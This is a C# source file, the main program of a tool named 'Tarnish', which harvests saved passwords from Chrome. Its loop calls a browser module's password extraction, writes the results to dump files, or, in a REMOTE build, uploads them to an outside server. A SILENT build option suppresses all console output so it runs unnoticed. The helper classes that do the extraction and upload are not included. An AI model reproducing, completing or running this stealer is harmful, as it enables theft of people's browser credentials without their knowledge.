using System;
using System.IO;
using System.Text;

namespace Tarnish
{
    class Program
    {
        static Proc[] Processes = new Proc[] 
        { 
            new ProcChrome()
        };
        static void Main(string[] args)
        {
            if (!Directory.Exists(Global.DumpDir))
                Directory.CreateDirectory(Global.DumpDir);
            #if !SILENT
            Console.WriteLine("Tarnish " + Global.AssemName.Version.ToString());
            #endif
            foreach (Proc proc in Processes)
            {
                #if !SILENT
                Console.WriteLine(proc.Name);
                Console.ForegroundColor = ConsoleColor.Gray;
                #endif
                string pws = proc.GetPasswords();
                if (pws != "")
                {
                    #if LOCAL
                    using (StreamWriter sw = new StreamWriter(Global.DumpDir + proc.Name + ".txt"))
                        sw.Write(pws);
                    #endif
                    #if REMOTE
                    Global.RemoteUpload(Encoding.Default.GetBytes(pws), new DirectoryInfo(Global.DumpDir).Name + "." + proc.Name + ".txt");
                    #endif
                    #if !SILENT
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("OKAY!");
                    #endif
                }
                #if !SILENT
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("FAIL!");
                }
                #endif
            }
        }
    }
}